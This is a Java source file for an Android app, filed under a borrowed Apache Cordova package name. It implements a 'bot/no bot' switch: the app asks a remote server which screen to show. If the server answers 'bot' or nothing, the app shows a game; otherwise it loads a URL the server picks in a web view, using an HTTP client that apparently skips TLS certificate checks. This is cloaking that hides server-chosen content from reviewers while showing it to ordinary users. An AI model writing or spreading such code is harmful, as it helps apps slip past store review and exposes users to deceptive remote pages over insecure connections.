package org.apache.cordova.repository.impl;

import android.content.Context;
import android.os.Handler;
import android.text.TextUtils;

import com.walhalla.ui.DLog;

import org.apache.cordova.domen.UIVisibleDataset;
import org.apache.cordova.http.HttpClient;
import org.apache.cordova.ScreenType;

import org.apache.cordova.repository.AbstractDatasetRepository;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
/**
 * Get URL From Server
 * Redirect {Header Location bot|no_bot}
 */

public class RemoteBotNoBotRepository extends AbstractDatasetRepository implements Callback {

    static final String TAG_BOT = "https://bot";

    private final String _URL_;
    private final Handler handler;

    public RemoteBotNoBotRepository(Handler handler, String _URL_, Context context) {
        super(context);
        this._URL_ = _URL_;
        this.handler = handler;
    }


    @Override
    public void getConfig(Context context) {
        OkHttpClient client = HttpClient.getUnsafeOkHttpClient(context);
        Request request = new Request.Builder()
                .url(_URL_)
                .build();
        Call call = client.newCall(request);
        call.enqueue(this);
    }

    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        DLog.handleException(e);
        //handler.post(() -> {
        callback.successResponse(new UIVisibleDataset(ScreenType.GAME_VIEW, null));
        //});
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {

        String empty = response.header("Location");
        String var1 = response.body().string();
        DLog.d("@" + empty);

        handler.post(() -> {
//            if (Config.TAG_NOBOT.equals(empty)) {
//                makeScreen(new UIVisibleDataset(WEB_VIEW, "https://google.com"));
//            } else if (Const.TAG_BOT.equals(empty)) {
//                makeScreen(new UIVisibleDataset(ScreenType.GAME_VIEW, null));
//            } else {
//                makeScreen(new UIVisibleDataset(ScreenType.GAME_VIEW, null));
//            }

            if (TAG_BOT.equals(empty) || TextUtils.isEmpty(empty)) {
                callback.successResponse(new UIVisibleDataset(ScreenType.GAME_VIEW, null));
            } else {
                if (/*Const.TAG_NOBOT.equals(empty)*/empty != null && !empty.isEmpty()) {
                    callback.successResponse(new UIVisibleDataset(ScreenType.WEB_VIEW, empty));
                } else {
                    callback.successResponse(new UIVisibleDataset(ScreenType.GAME_VIEW, null));
                }
            }
        });
    }


}
